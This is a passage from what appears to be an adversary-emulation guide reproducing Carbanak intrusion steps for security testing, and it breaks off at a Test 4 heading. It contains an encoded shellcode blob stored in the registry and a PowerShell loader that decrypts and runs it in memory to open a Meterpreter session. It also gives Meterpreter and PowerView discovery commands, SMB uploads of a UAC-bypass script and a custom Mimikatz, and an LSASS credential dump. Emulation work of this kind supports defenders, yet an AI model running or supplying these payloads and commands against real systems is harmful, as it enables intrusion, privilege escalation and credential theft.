<pre class="language-batch"><code v-pre class="language-batch">REG ADD &quot;HKCU\Software\InternetExplorer\AppDataLow\Software\Microsoft\InternetExplorer&quot; /v &quot;{018247B2CAC14652E}&quot; /t REG_SZ /d H4sIAJEshl4C/2sx/Dmnc9KWyqoKC21LTQ1NfSPP1fIGnzQkDD9qJRp91o4y+MShYVh63tjA1GOzgceuK67SLNVhERa7N5ZYV+6YMVXbWhOoMvKjlatR5UqZn4xJxdWlf7mrKio//vgIJI3+7uSTN6xeofnRINHus2WUYcWq2fpG7RusP/t+MqhYAzUTaprTDJ5ukyqzmEJ7xxX8CxSB6uOA6uUsPpYYAtlpQLblp7oPQNMslCwVVRSVrRUslC2VjX5PjbLUbp2haK2obPQ5e7JxW2u7ivExPk4vNU+vyipLfeOP841+Tr1VWVll+GG+4dGKirRXOy5W1VjoGX6YZ/Kh2/KwGX98bfsas4+ThSorqioUrA8F/BKubF0rXGCprqVh4r3RxHuHYesOw8+7wOROiwOTypbOaFtv8GGvUKa1gunnWYafGy0OPLzDJ9m2HujfIoPWbTzzJ7wCef/31CyDDzOA3hSqtVYAK6tasEm9bf3vxio2HaPfe6PUPvQIWVorClZlAJ2qaPSx28hzg/UhxXvac1rXGn7ebfB5P9ABBp87DD8vQtXOGqhkqacsUGlVUWmtIFylZHGgOKzUo229PtD9PCKmEq1rgc6Y4Nbe1mpQsdMgYI/Bnx7es9bt85SEKpUN9+3oOHNDr209AOpTVHH+AQAA</code></pre>
</doc-codeblock></div>
</li>
</ol>
<doc-anchor-target id="2c---execute-2nd-stage-rat-t1012-t1055">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#2c---execute-2nd-stage-rat-t1012-t1055">#</doc-anchor-trigger>
        <span>2.C - Execute 2<sup>nd</sup> stage RAT (<a href="https://attack.mitre.org/techniques/T1012/" class="outbound" target="_blank"><span>T1012</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://attack.mitre.org/techniques/T1055/" class="outbound" target="_blank"><span>T1055</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li><p>In the PowerShell window, copy, paste, and run the following PowerShell Blob to execute the Registry shellcode:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">$Signature = @&quot;
[DllImport(&quot;kernel32.dll&quot;)]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(&quot;kernel32.dll&quot;)]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
&quot;@
$WinObj = Add-Type -memberDefinition $Signature -Name &quot;Win32&quot; -namespace Win32Functions -passthru
$key = [System.Text.Encoding]::UTF8.GetBytes(&quot;xyz&quot;)
$Payload = (Get-ItemProperty -Path HKCU:\Software\InternetExplorer\AppDataLow\Software\Microsoft\InternetExplorer).'{018247B2CAC14652E}'
$bytes = [System.Convert]::FromBase64String($Payload)
$in = New-Object System.IO.MemoryStream( , $bytes )
$output = New-Object System.IO.MemoryStream
$sr = New-Object System.IO.Compression.GzipStream $in, ([IO.Compression.CompressionMode]::Decompress)
$sr.CopyTo($output)
$sr.Close()
$in.Close()
[byte[]] $byteOutArray = $output.ToArray()
[byte[]]$decrypted = @()
for ($i = 0; $i -lt $byteOutArray.Length; $i++) {
    $decrypted += $byteOutArray[$i] -bxor $key[$i % $key.Length]
}
$WinMem = $WinObj::VirtualAlloc(0,[Math]::Max($decrypted.Length,0x1000),0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($decrypted,0,$WinMem,$decrypted.Length)
$WinObj::CreateThread(0,0,$WinMem,0,0,0)</code></pre>
</doc-codeblock></div>
</li>
</ol>
<p>On the <code v-pre>Attack Platform</code>:</p>
<ol>
<li><p>Interact with new Meterpreter session</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">msf &gt; sessions -i 1</code></pre>
</doc-codeblock></div>
</li>
<li><p>Check Meterpreter session status</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; getpid</code></pre>
</doc-codeblock></div>
</li>
</ol>
<doc-anchor-target id="2d---local-and-domain-discovery-t1083-t1018-t1069">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#2d---local-and-domain-discovery-t1083-t1018-t1069">#</doc-anchor-trigger>
        <span>2.D - Local and Domain Discovery (<a href="https://attack.mitre.org/techniques/T1083/" class="outbound" target="_blank"><span>T1083</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://attack.mitre.org/techniques/T1018/" class="outbound" target="_blank"><span>T1018</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://attack.mitre.org/techniques/T1069/" class="outbound" target="_blank"><span>T1069</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li><p>Look for files in user home directory</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; ls C:\\Users\\&lt;domain_admin&gt;.&lt;domain&gt;\\</code></pre>
</doc-codeblock></div>
</li>
<li><p>Load PowerShell into memory</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; load powershell</code></pre>
</doc-codeblock></div>
</li>
<li><p>Import <code v-pre>PowerView</code> into memory</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; powershell_import /home/&lt;attacker&gt;/Enterprise/carbanak/Resources/step6/powerview.ps1</code></pre>
</doc-codeblock></div>
</li>
<li><p>Execute <code v-pre>PowerView</code>&#x27;s <code v-pre>Get-NetComputer</code> from memory</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; powershell_execute Get-NetComputer</code></pre>
</doc-codeblock></div>
</li>
<li><p>Execute <code v-pre>PowerView</code>&#x27;s <code v-pre>Find-LocalAdminAccess</code> from memory and write its output to a file on disk</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; powershell_execute &quot;Find-LocalAdminAccess | Out-File C:\\Users\\&lt;domain_admin&gt;.&lt;domain&gt;\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt&quot;</code></pre>
</doc-codeblock></div>
<p>You will likely see an error:</p>
<p><code v-pre>Error running command powershell_execute: Rex::TimeoutError Operation timed out.</code></p>
<p>That&#x27;s okay - don&#x27;t freak out!</p>
<p>Meterpreter thinks the script timed out, but it is still running in the background.</p>
<p>Wait <code v-pre>60</code> seconds to allow the script to finish.</p>
</li>
<li><p>Read the contents of the output file</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; cat C:\\Users\\&lt;domain_admin&gt;.&lt;domain&gt;\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt</code></pre>
</doc-codeblock></div>
</li>
<li><p>Exit the Meterpreter session</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; exit</code></pre>
</doc-codeblock></div>
</li>
<li><p>Exit Metasploit</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">msf &gt; exit</code></pre>
</doc-codeblock></div>
</li>
<li><p>Close <code v-pre>hrmanager</code> RDP session</p>
</li>
</ol>
<doc-anchor-target id="cited-intelligence-1">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence-1">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li>Carbanak is known to rely on Powershell to execute custom scripts and download 2nd stage RATs.<sup><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/operation-grand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/" class="outbound" target="_blank"><span>4</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>,<a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></sup></li>
<li>Carbanak will employ multiple methods of obfuscation to conceal their activities.<sup><a href="https://www.bitdefender.com/files/News/CaseStudies/study/262/Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf" class="outbound" target="_blank"><span>1</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></sup></li>
</ul>
<hr>
<doc-anchor-target id="test-3-uac-bypass-and-credential-dumping">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#test-3-uac-bypass-and-credential-dumping">#</doc-anchor-trigger>
        <span>Test 3: UAC Bypass and Credential Dumping</span>
    </h2>
</doc-anchor-target>
<p>The attacker uploads two files (<a href="https://attack.mitre.org/techniques/T1105/" class="outbound" target="_blank"><span>T1105</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>) to perform credential dumping: <strong>rad353F7.ps1</strong> (UAC bypass) and <strong>smrs.exe</strong> (customized Mimikatz, called ATTACKKatz in this repository). The attacker executes <strong>rad353F7.ps1</strong> via PowerShell (<a href="https://attack.mitre.org/techniques/T1059/001/" class="outbound" target="_blank"><span>T1059.001</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>), which in turn executes <strong>smrs.exe</strong> in high integrity (<a href="https://attack.mitre.org/techniques/T1548/002/" class="outbound" target="_blank"><span>T1549.002</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>). <strong>smrs.exe</strong> dumps plaintext credentials for the current user (<a href="https://attack.mitre.org/techniques/T1003/001/" class="outbound" target="_blank"><span>T1003.001</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>).</p>
<p><strong>FAQ About ATTACKkatz.exe</strong></p>
<p>attackkatz (smrs.exe in step 4.B) leverages the <a href="https://adsecurity.org/?page_id=1821#SEKURLSALogonPasswords" class="outbound" target="_blank"><span>Logonpasswords</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> functionality of Mimikatz to obtain passwords. This dumps LSASS memory to obtain credentials for users on the domain that have logged in to this machine (<a href="https://attack.mitre.org/techniques/T1003/001/" class="outbound" target="_blank"><span>T1003.001</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>).</p>
<p>This step consists of behaviors found in Step 4 of Scenario 1.</p>
<doc-anchor-target id="procedures-2">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-2">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="3a---uac-bypass-and-credential-dumping-t1549002-t1003001">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#3a---uac-bypass-and-credential-dumping-t1549002-t1003001">#</doc-anchor-trigger>
        <span>3.A - UAC Bypass and Credential Dumping (<a href="https://attack.mitre.org/techniques/T1548/002/" class="outbound" target="_blank"><span>T1549.002</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://attack.mitre.org/techniques/T1003/001/" class="outbound" target="_blank"><span>T1003.001</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>)</span>
    </h4>
</doc-anchor-target>
<p>On <code v-pre>hrmanager</code>:</p>
<ol>
<li><p>Login to victim workstation as <code v-pre>&lt;domain_admin&gt;</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">xfreerdp +clipboard /u:&quot;&lt;domain_admin&gt;@&lt;domain_full&gt;&quot; /p:&quot;&lt;domain_admin_password&gt;&quot; /v:&lt;hrmanager_ip&gt;</code></pre>
</doc-codeblock></div>
</li>
<li><p>Confirm that the following path is present via file explorer:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">C:\Users\&lt;domain_admin&gt;.&lt;domain&gt;\AppData\Roaming\TransbaseOdbcDriver\</code></pre>
</doc-codeblock></div>
<p>If not, create it with CMD:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">mkdir C:\Users\&lt;domain_admin&gt;.&lt;domain&gt;\AppData\Roaming\TransbaseOdbcDriver\</code></pre>
</doc-codeblock></div>
</li>
</ol>
<p>On the <code v-pre>Attack Platform</code>:</p>
<ol>
<li><p>Upload UAC Bypass script to <code v-pre>hrmanager</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">sudo smbclient -U '&lt;domain_full&gt;\&lt;domain_admin&gt;' //&lt;hrmanager_ip&gt;/C$ -c &quot;put /home/&lt;attacker&gt;/Enterprise/carbanak/Resources/step4/uac-bypass.ps1 Users\\&lt;domain_admin&gt;.&lt;domain&gt;\\AppData\\Roaming\\TransbaseOdbcDriver\\rad353F7.ps1&quot;</code></pre>
</doc-codeblock></div>
<p>Use <code v-pre>&lt;domain_admin&gt;</code>&#x27;s password when prompted.</p>
<p><code v-pre>&lt;domain_admin_password&gt;</code></p>
</li>
<li><p>Upload Mimikatz (custom) to <code v-pre>hrmanager</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">sudo smbclient -U '&lt;domain_full&gt;\&lt;domain_admin&gt;' //&lt;hrmanager_ip&gt;/C$ -c &quot;put /home/&lt;attacker&gt;/Enterprise/carbanak/Resources/step4/attackkatz.exe Users\\&lt;domain_admin&gt;.&lt;domain&gt;\\AppData\\Roaming\\TransbaseOdbcDriver\\smrs.exe&quot;</code></pre>
</doc-codeblock></div>
</li>
</ol>
<p>Back on <code v-pre>hrmanager</code>:</p>
<ol>
<li><p>Execute the UAC Bypass script from a PowerShell window:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">cd C:\Users\&lt;domain_admin&gt;.&lt;domain&gt;\AppData\Roaming\TransbaseOdbcDriver\
.\rad353F7.ps1</code></pre>
</doc-codeblock></div>
</li>
<li><p>Read Mimikatz output</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">Get-Content &quot;C:\\Users\\&lt;domain_admin&gt;.&lt;domain&gt;\\AppData\\Roaming\\TransbaseOdbcDriver\\MGsCOxPSNK.txt&quot;</code></pre>
</doc-codeblock></div>
</li>
<li><p>Close all windows on <code v-pre>hrmanager</code> and close the RDP session</p>
</li>
</ol>
<doc-anchor-target id="cited-intelligence-2">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence-2">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li>The Carbank malware contains a UAC bypass. <sup><a href="https://www.fireeye.com/blog/threat-research/2019/04/carbanak-week-part-two-continuing-source-code-analysis.html" class="outbound" target="_blank"><span>16</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></sup></li>
<li>Carbanak is known to use Mimikatz to facilitate privilege escalation.<sup><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>,<a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/" class="outbound" target="_blank"><span>8</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></sup></li>
</ul>
<hr>
<doc-anchor-target id="test-4-lateral-movement-via-pass-the-hash">
    <h2>
